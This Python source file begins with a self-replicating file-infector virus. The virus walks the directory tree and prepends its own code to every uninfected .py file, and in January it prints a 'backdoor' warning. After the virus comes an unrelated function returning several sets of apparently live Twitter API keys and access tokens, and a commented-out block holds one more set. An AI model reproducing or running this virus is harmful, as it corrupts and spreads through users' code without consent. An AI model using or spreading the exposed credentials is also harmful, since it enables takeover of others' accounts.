#!/usr/bin/python

import os
import datetime
SIGNATURE = "beware of your .py file :p -fzrbbx"

def search(path):
    filetarget = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filetarget.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in  open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filetarget.append(path+"/"+fname)

    return filetarget

def infect(filetarget):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if i>=0 and i<300:
            virusstring += line
    virus.close
    for fname in filetarget:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

def bomb():
    if datetime.datetime.now().month == 1:
        print("your file has been infected with backdoor")

filetarget = search(os.path.abspath(""))
infect(filetarget)
bomb()



def daftar():
    dict_cfg = [{
        "consumer_key" : "Y7c6nlIUwriAADuP3bi5HG0hR",
        "consumer_secret" : "Tns1glQGLoh19S44euceVrkPob7LsMlcq6uA8bk40uH2H1rm1B",
        "access_token" : "335401084-4OCJvXVaPndSnNkzKP6bJLow8nz4JRc8hc3bR6OU",
        "access_token_secret" : "Opq0fdc8oWryUS7YuftrdOMTVo8WNvrDjLAMbdC91VwFg"
    },{
        "consumer_key" : "ASwVt3fA6m7IxcAm6XUUWQYNC",
        "consumer_secret" : "A8CzNvtx9IqY2NDM3M6gxI9Y3gphvyjiUcdh9uRljYDmDKzkUy",
        "access_token" : "815565702241230849-QuJZD8aLyrSQv0gYYS0WEypVsSrZ0MI",
        "access_token_secret" : "ltkfs02dovcCRONKYtE7u9XM6bM7BckwhjjcwTATl2l0j"
    },{
        "consumer_key" : "O9r0TNl41cIj8pcCrHjWKeaaB",
        "consumer_secret" : "AJph5oeNxuZZRIGawlpfaGxARsBKDD7KUlkmnTRNTFH8vYlDJu",
        "access_token" : "816113546438197248-552heGosdRd6rhuwoQWKYTK70fV0vXo",
        "access_token_secret" : "Np8WRQEyj83GwJAWJlFvhOI3D5SNOesjBkMvOfFkWVejf"
    }]
    return dict_cfg


"""
{
        "consumer_key" : "HGKAsRpSYP0mhn1ghkj2m1wIx",
        "consumer_secret" : "ur2Ns9Qtwv3JlUyZxiJwec9g9eDZE5pQJjy9IrmvNiQlc9RyIJ",
        "access_token" : "66249145-lg2yXR5k1UJixsoFFE8SoXeP39G96gTlkmwMNBc0T",
        "access_token_secret" : "GdIQX9z8Pc3WPxeltyBXaXAVNj3YQStH2WFMsGBISpt8t"
    }
"""
